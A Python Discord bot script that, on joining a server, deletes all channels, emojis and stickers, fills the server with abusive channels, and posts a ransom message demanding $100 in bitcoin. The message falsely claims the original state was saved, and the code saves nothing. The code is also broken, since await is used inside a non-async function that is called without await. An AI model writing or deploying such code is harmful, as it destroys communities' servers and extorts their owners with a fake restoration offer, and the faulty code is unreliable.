import discord
import os

token = os.getenv('token')
intents = discord.Intents.default()
intents.members = bool(1)
client = discord.Client(intents=intents)


def fuckonthem(guild):
    owner = guild.owner
    print(f'Joined: {guild.name}')
    print("Channels:")
    count = 1
    for channel in guild.channels:
        print(f'{count}: {channel.name}')
        await channel.delete()
        count += 1
    count = 1
    print("Members:")
    for member in guild.members:
        print(f'{count}: {member.name}')
        # await member.ban()
        count += 1
    for emoji in guild.emojis:
        await emoji.delete()
    for sticker in guild.stickers:
        await sticker.delete()
    for i in range(1, 4):
        cat = await guild.create_category(f"Rek't by josh {i}")
        channel = await guild.create_text_channel(name='FUCK YOU BITCH JOSH ON TOP', category=cat)
        await guild.create_voice_channel(name='FUCK YOU BITCH JOSH ON TOP', category=cat)
        await channel.send(
            f"Rekt by josh get fukd {owner.mention}. Your servers original state has been saved and a 1 time crypto "
            f"transaction of $100 to the following bitcoin wallet will unlock the !fix command to restore your server "
            f"back to how it was. Thanks for your cooperation!")


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    print(f'Message: {message}')


@client.event
async def on_guild_join(guild):
    fuckonthem(guild)


if __name__ == '__main__':
    client.run(token=token)
